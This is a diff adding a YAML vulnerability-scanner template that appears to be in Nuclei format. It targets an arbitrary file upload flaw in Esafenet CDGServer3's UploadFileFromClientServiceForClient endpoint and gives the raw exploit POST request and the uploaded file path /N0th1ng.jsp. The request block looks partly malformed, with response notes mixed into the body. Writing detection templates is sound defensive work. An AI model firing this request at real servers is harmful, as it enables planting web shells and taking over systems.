@@ -1,0 +1,39 @@
+id: poc-tp4i9a4omznemnme
+info:
+  name: 亿赛通UploadFileFromClientServiceForClient接口任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tp4i9a4omznemnme'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tp4i9a4omznemnme
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBLAOLBAKBNDHLIGBKEOJLICAIDMGEDJKGP HTTP/1.1
+
+
+
+
+    dudesuite
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /N0th1ng.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
